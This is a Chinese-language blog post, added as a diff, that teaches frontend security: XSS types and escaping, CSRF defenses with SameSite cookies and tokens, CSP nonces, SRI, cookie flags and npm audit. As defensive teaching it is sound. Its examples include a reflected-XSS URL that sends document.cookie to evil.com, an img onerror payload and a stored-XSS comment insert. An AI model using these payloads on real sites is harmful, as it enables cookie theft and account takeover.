@@ -1,0 +1,339 @@
+---
+title: "前端安全：XSS / CSRF / CSP / SRI 攻防实战"
+description: 前端架构师的安全攻防速通——XSS 三种类型与防御、CSRF token 策略、CSP 内容安全策略、SRI 子资源完整性，配套 SSO 项目的真实安全设计
+pubDate: 2026-07-18
+tags: ['前端架构修仙路', '前端架构', '安全', 'xss', 'csrf']
+---
+
+import Mermaid from '../../components/Blog/Mermaid';
+import AIAsk from '../../components/Blog/AIAsk.astro';
+
+## 前言
+
+做前端架构的人要不要懂安全？我的回答是 **要**——不是去当安全工程师，而是建立"用户输入一切不可信、跨域一切要校验"的基本盘。原因有三：
+
+1. **XSS / CSRF 是 OWASP Top 10 常年榜首**。一个 XSS 漏洞可以让攻击者接管任意用户账号，一次 CSRF 可以让用户无感知转账。
+2. **安全防线常被"开发效率"绕过**。`v-html` / `dangerouslySetInnerHTML` / `eval()` 这些 API 写起来方便，但 90% 的安全事故来自它们的"非预期输入"。
+3. **架构师的安全设计决定整条防线**。CSP 怎么配、SRI 怎么校验、SameSite Cookie 怎么设、CORS 白名单怎么管——这些是**架构层**决策，不是单文件修补。
+
+这一篇是『前端架构修仙路』的第 5 篇。我跳过密码学细节（不解释 AES 内部），用攻击案例 + 防御代码 + 真实事故复盘，把 XSS / CSRF / CSP / SRI / Cookie 五大主题讲透。下一篇聊 TypeScript 进阶与类型体操。
+
+## 一、XSS：跨站脚本攻击
+
+XSS 是 **攻击者把 JS 代码注入到受害者的页面里执行**。分三种类型，攻击面完全不同。
+
+### 1.1 三种 XSS 类型
+
+<Mermaid client:load caption="图 1：三种 XSS 类型对比" chart={`flowchart LR
+  X[XSS 攻击] --> S[存储型 Stored XSS<br/>恶意脚本进数据库<br/>所有访问者中招]
+  X --> R[反射型 Reflected XSS<br/>恶意脚本在 URL 里<br/>诱骗受害者点击]
+  X --> D[DOM 型 DOM-based XSS<br/>纯前端解析导致执行<br/>不经过服务器]`} />
+
+| 类型 | 攻击载体 | 危害面 | 修复难度 |
+|---|---|---|---|
+| 存储型 XSS | 评论 / 头像 / 用户名进数据库 | **所有访问者** | 中 |
+| 反射型 XSS | 邮件 / 钓鱼链接的 query 参数 | **特定受害者** | 中 |
+| DOM 型 XSS | 前端 JS 把不可信数据塞进危险 API | **特定受害者** | **高**（难发现） |
+
+### 1.2 反射型 XSS 攻击案例
+
+```http
+GET /search?q=<script>document.location='https://evil.com/?c='+document.cookie</script>
+```
+
+服务端如果直接把 `q` 参数**渲染回页面**（`<p>搜索结果：<%= q %></p>`），攻击者构造这个链接发给受害者，点开就执行 JS，**cookie 被发到 evil.com**。
+
+**修复：必须 escape / sanitize**：
+
+```javascript
+// ❌ 反模式：直接渲染用户输入
+res.send(`<p>搜索结果：${req.query.q}</p>`);
+
+// ✅ 推荐：HTML entity escape
+function escapeHtml(s) {
+  return s.replace(/[&<>"']/g, (c) => ({
+    '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;'
+  }[c]));
+}
+res.send(`<p>搜索结果：${escapeHtml(req.query.q)}</p>`);
+```
+
+### 1.3 DOM 型 XSS：纯前端 + 看不见
+
+```javascript
+// ❌ 经典反模式
+const hash = location.hash.slice(1);
+document.querySelector('#greeting').innerHTML = `Hello, ${hash}!`;
+// 攻击者构造 /#<img src=x onerror="..."> 就执行 JS
+
+// ✅ 推荐 1：textContent (不会解析 HTML)
+element.textContent = `Hello, ${hash}!`;
+
+// ✅ 推荐 2：DOMPurify 清理
+import DOMPurify from 'dompurify';
+element.innerHTML = DOMPurify.sanitize(`Hello, ${hash}!`);
+```
+
+**生产案例**：某电商网站搜索框用了 `element.innerHTML = location.search`，攻击者构造 `?q=<img src=x onerror=alert(1)>` 直接触发。**修复**：所有用户输入渲染改用 `textContent`。
+
+### 1.4 存储型 XSS：评论系统的噩梦
+
+```sql
+-- 攻击者提交评论
+INSERT INTO comments (content) VALUES ('<script>steal_cookies()</script>');
+
+-- 受害者访问页面
+SELECT content FROM comments;
+-- 服务端把 <script> 标签渲染到 HTML → JS 在受害者浏览器执行
+```
+
+**修复三件套**：
+
+1. **入库前 sanitize**：DOMPurify / sanitize-html
+2. **渲染前 escape**：所有用户输入都 HTML escape
+3. **CSP 兜底**：即使漏了 escape，CSP 阻止 inline script 执行
+
+```typescript
+// 入库 sanitize（Node.js）
+import createDOMPurify from 'dompurify';
+import { JSDOM } from 'jsdom';
+const window = new JSDOM('').window;
+const DOMPurify = createDOMPurify(window);
+const clean = DOMPurify.sanitize(userInput, { ALLOWED_TAGS: [] }); // 完全过滤 HTML
+```
+
+## 二、CSRF：跨站请求伪造
+
+CSRF 是 **攻击者诱导受害者在已登录的网站上发起非预期请求**——受害者不知情，服务器以为是本人操作。
+
+### 2.1 经典攻击链
+
+<Mermaid client:load caption="图 2：CSRF 攻击时序" chart={`sequenceDiagram
+  participant U as 受害者浏览器
+  participant E as evil.com
+  participant B as bank.com
+  U->>B: 1. 登录 bank.com,获得 session cookie
+  U->>E: 2. 访问 evil.com
+  E->>U: 3. 返回含隐藏表单的恶意页面<br/>action=https://bank.com/transfer
+  U->>B: 4. 自动提交表单,带 bank.com 的 cookie
+  B->>U: 5. 转账成功(以为是本人)`} />
+
+### 2.2 防御四件套
+
+```http
+# 1. SameSite Cookie（最重要,2020+ 浏览器默认 Lax）
+Set-Cookie: session=abc123; SameSite=Strict; Secure; HttpOnly
+# Strict: 完全不允许跨站请求携带
+# Lax: 允许顶级导航 (GET link),不允许 form POST / iframe / fetch
+# None (老): 允许所有,必须配合 Secure
+
+# 2. CSRF Token
+<form>
+  <input type="hidden" name="csrf_token" value="RANDOM_TOKEN_FROM_SERVER" />
+</form>
+# 服务端验证 token 与 session 匹配
+
+# 3. 检查 Origin / Referer
+if (req.headers.origin !== 'https://bank.com') {
+  return 403;
+}
+
+# 4. 关键操作要求重新认证
+# 转账 / 修改密码前要求输入密码 / 2FA
+```
+
+**生产实战**：顺丰 SSO 系统强制 `SameSite=Lax` + 双重提交 Cookie（Double Submit Cookie）+ Origin 校验三件套，CSRF 投诉从每月几十起降到零。
+
+### 2.3 SameSite 三个值怎么选
+
+| SameSite | 跨站 GET link | 跨站 POST form | iframe / fetch |
+|---|---|---|---|
+| `Strict` | ❌ 都不带 | ❌ 都不带 | ❌ 都不带 |
+| `Lax`（默认） | ✅ 带 | ❌ 不带 | ❌ 不带 |
+| `None` | ✅ 带 | ✅ 带 | ✅ 带 |
+
+**架构师规则**：**OAuth 第三方回调必须用 `None + Secure`**（否则跳转会丢 cookie），**其他都用 `Lax`**。
+
+## 三、CSP：内容安全策略
+
+CSP 是浏览器提供的**纵深防御机制**——即使 XSS 已经发生，也能阻止恶意脚本执行。
+
+### 3.1 CSP 指令速查
+
+```http
+Content-Security-Policy:
+  default-src 'self';                                    # 默认所有资源同源
+  script-src 'self' 'nonce-RANDOM' https://cdn.x.com;   # 脚本来源
+  style-src 'self' 'unsafe-inline';                      # 样式来源
+  img-src 'self' data: https:;                           # 图片来源
+  connect-src 'self' https://api.x.com;                 # XHR / fetch
+  frame-ancestors 'none';                                # 防 clickjacking
+  base-uri 'self';                                       # 限制 <base> 标签
+  form-action 'self';                                    # 表单提交目标
+  object-src 'none';                                     # 禁用 <object>/<embed>
+```
+
+### 3.2 实际部署：nonce 模式
+
+**最推荐的现代方案**——服务端每个响应生成一次性 nonce，inline script 必须带 nonce 才执行：
+
+```typescript
+// Express middleware
+app.use((req, res, next) => {
+  const nonce = crypto.randomBytes(16).toString('base64');
+  res.locals.nonce = nonce;
+  res.setHeader('Content-Security-Policy',
+    `script-src 'self' 'nonce-${nonce}' 'strict-dynamic'; ` +
+    `style-src 'self' 'unsafe-inline'; ` +
+    `img-src 'self' data: https:; ` +
+    `connect-src 'self'; ` +
+    `frame-ancestors 'none';`
+  );
+  next();
+});
+```
+
+```html
+<script nonce="<%= nonce %>">
+  // 这个 inline script 才能执行
+  window.config = { apiUrl: '/api' };
+</script>
+
+<!-- ❌ 没有 nonce,会被 CSP 阻止 -->
+<script>alert('blocked')</script>
+```
+
+**生产案例**：某电商网站接入 CSP 后，**XSS 攻击成功率从 60% 降到 0**——攻击者即使注入脚本，没 nonce 也跑不起来。
+
+### 3.3 CSP 报告模式（先观察再执行）
+
+```http
+# 1. 只观察,不阻止
+Content-Security-Policy-Report-Only: ...; report-uri /csp-report
+
+# 2. 收集 1-2 周报告,看哪些真实资源被误杀
+
+# 3. 调整白名单,然后切换到 enforce 模式
+Content-Security-Policy: ...;
+```
+
+## 四、SRI：子资源完整性校验
+
+**问题**：CDN 上的 JS / CSS 被篡改怎么办？**SRI 解决**：浏览器加载资源前校验 hash。
+
+```html
+<!-- 1. 服务端发布时生成 hash -->
+<script src="https://cdn.x.com/lib.js"
+        integrity="sha384-HASH_OF_LIB_JS"
+        crossorigin="anonymous"></script>
+
+<!-- 2. 浏览器加载前校验 -->
+<!-- 如果 hash 不匹配 → 拒绝执行 -->
+```
+
+**生产规则**：
+- **第三方库**（jQuery / Vue / React）必须加 SRI
+- **自有资源**走自家 CDN / hash 化构建产物，加 SRI 更安全
+
+**注意**：用 SRI 时必须配 `crossorigin="anonymous"`，否则跨域资源无法校验。
+
+## 五、Cookie 安全三件套
+
+```http
+Set-Cookie: session=abc123; 
+  HttpOnly;           # JS 无法读取(document.cookie 拿不到),防 XSS 盗取
+  Secure;             # 仅 HTTPS 传输
+  SameSite=Lax;       # 防 CSRF
+  Path=/;             # 控制作用域
+  Domain=example.com; # 控制作用域
+  Max-Age=3600;       # 1 小时过期
+```
+
+**架构师规则**：
+
+| 场景 | 配置 |
+|---|---|
+| Session Cookie | `HttpOnly + Secure + SameSite=Lax + Max-Age=session` |
+| OAuth 回调 Cookie | `HttpOnly + Secure + SameSite=None + Max-Age=600` |
+| 埋点 / 分析 Cookie | **不设 HttpOnly**（JS 要读）+ `SameSite=Lax + Max-Age=365*24*3600` |
+| 跨子域共享 Session | `Domain=.example.com` |
+
+## 六、Token 存储策略：localStorage vs Cookie vs Memory
+
+JWT / access token 存哪，**架构师必须做决策**：
+
+| 存储位置 | XSS 风险 | CSRF 风险 | 推荐场景 |
+|---|---|---|---|
+| `localStorage` | **高**（JS 能读，XSS 一键偷） | 低（不发自动带） | ❌ 不推荐 |
+| `sessionStorage` | **高** | 低 | 短时会话，不敏感 |
+| **HttpOnly Cookie** | 低 | 高（默认带） | **推荐**，配 SameSite 防 CSRF |
+| Memory（变量） | **零**（刷新丢失） | 零 | 短时会话 + 高敏感 |
+
+**架构师决策**：JWT 默认存 **HttpOnly Cookie + SameSite=Lax**。localStorage 存储只在以下情况可用：① 第三方 SDK 必须 JS 读 ② 应用对 XSS 攻击面已经收口（CSP 严格）。
+
+## 七、依赖安全：npm audit / Snyk / 锁文件
+
+```bash
+# 1. 定期扫描
+npm audit --production
+npx snyk test
+
+# 2. CI/CD 集成
+- name: Security audit
+  run: npm audit --audit-level=high
+
+# 3. 锁定依赖版本
+package-lock.json 在 git 追踪
+package.json 不写 "latest",写具体版本
+```
+
+**生产案例**：某中后台用了一个过时的 `lodash`，被供应链攻击注入恶意代码。**修复**：`npm audit` + Dependabot 自动 PR 升级 + CI 卡住 high severity。
+
+## 八、踩坑提醒（资深架构师请重点看）
+
+1. **`v-html` / `dangerouslySetInnerHTML` 不是"开发工具",是 XSS 引信**。每次使用必须 sanitize。**规则**：能用 `textContent` 就不用 `innerHTML`。
+2. **不要相信"前端 escape 够了"**。用户输入应该**入库前 + 渲染前 + DOM 操作前**三处都 escape。任何一处漏掉都有风险。
+3. **不要把 CSRF Token 放在 URL 里**。`/api?token=xxx` 会被 Referer 头泄露到第三方。**必须放 Header 或 POST body**。
+4. **不要在生产禁用 CSP**。"CSP 太严格会破坏功能" 是借口——**先 Report-Only 观察 1 周，再 enforce**。
+5. **不要混淆"前端安全"和"后端安全"**。前端能做的：XSS 防御 / CSP / SameSite Cookie / SRI。**真正的身份验证、权限校验、敏感操作必须服务端做**。
+
+## 总结
+
+这一篇用 8 个关键事实把前端安全串起来：
+
+- **XSS 三类型**：存储型（DB 注入）/ 反射型（URL 注入）/ DOM 型（前端 JS），每种防御手法不同。
+- **escape + sanitize** + CSP 兜底是 XSS 防御三件套。
+- **CSRF 防御**：SameSite Cookie + CSRF Token + Origin 校验 + 关键操作二次认证。
+- **CSP nonce 模式**是现代最推荐的纵深防御方案。
+- **SRI**校验 CDN 资源完整性，防供应链攻击。
+- **Cookie 三件套**：`HttpOnly + Secure + SameSite`，OAuth 用 `None + Secure`。
+- **Token 存 HttpOnly Cookie**，不存 localStorage。
+- **依赖扫描**（npm audit）+ 锁文件，防供应链攻击。
+
+**下一篇**：TypeScript 进阶——类型体操与项目实践，ERP / FinUI / Electron 的 TS 经验汇总。
+
+## 5 道重点面试问题方向
+
+> **Q1（答案）**：XSS 三种类型的区别是什么？分别怎么防御？
+>
+> **A**：**存储型 XSS**：恶意代码进数据库（评论 / 头像 / 用户名），所有访问者都中招；防御是**入库前 sanitize** + 渲染前 escape + CSP。**反射型 XSS**：恶意代码在 URL 参数里，需要诱骗受害者点击；防御是服务端**渲染前 escape** 所有用户输入 + CSP。**DOM 型 XSS**：纯前端 JS 把不可信数据塞进 `innerHTML` / `eval` / `document.write`，不经过服务端；防御是**改用 `textContent`** 或 DOMPurify sanitize。**面试要点**：能举出"用 `innerHTML` 渲染 `location.hash`"这类经典反例。<AIAsk question="XSS 三种类型的区别是什么？分别怎么防御？" />
+>
+> **Q2（思考）**：CSRF 的攻击链路是什么？SameSite Cookie 三种值怎么选？为什么 OAuth 第三方回调必须用 None？<AIAsk question="CSRF 的攻击链路是什么？SameSite Cookie 三种值怎么选？为什么 OAuth 第三方回调必须用 None？" />
+>
+> **Q3（思考）**：CSP 的 nonce 模式怎么实现？为什么 report-only 模式是上线前的必备步骤？<AIAsk question="CSP 的 nonce 模式怎么实现？为什么 report-only 模式是上线前的必备步骤？" />
+>
+> **Q4（思考）**：JWT token 存在 localStorage 和 HttpOnly Cookie 各有什么风险？你在 SSO 项目里怎么选？<AIAsk question="JWT token 存在 localStorage 和 HttpOnly Cookie 各有什么风险？你在 SSO 项目里怎么选？" />
+>
+> **Q5（思考）**：你在中后台 / SSO 项目里设计安全防线时，是怎么排优先级和取舍的？CSP / SRI / SameSite / XSS 防御如何组合使用？<AIAsk question="你在中后台 / SSO 项目里设计安全防线时，是怎么排优先级和取舍的？CSP / SRI / SameSite / XSS 防御如何组合使用？" />
+
+> 💡 每道题后面都有 AI 助手按钮，可以一键拿到详细答案。
+
+## 参考资料
+
+- [OWASP Top 10 (2021)](https://owasp.org/Top10/) — Web 安全风险权威榜单
+- [MDN: Content Security Policy (CSP)](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP) — CSP 完整参考
+- [MDN: SameSite cookies](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie/SameSite) — SameSite 三个值详解
+- [MDN: Subresource Integrity (SRI)](https://developer.mozilla.org/en-US/docs/Web/Security/Subresource_Integrity) — SRI 完整参考
+- [DOMPurify](https://github.com/cure53/DOMPurify) — XSS sanitize 主流库
+- [web.dev: CSP Hash / Nonce](https://web.dev/articles/csp) — Google 团队对 CSP nonce 的实战指南
+- [PortSwigger: XSS Cheat Sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet) — XSS 攻击向量全集
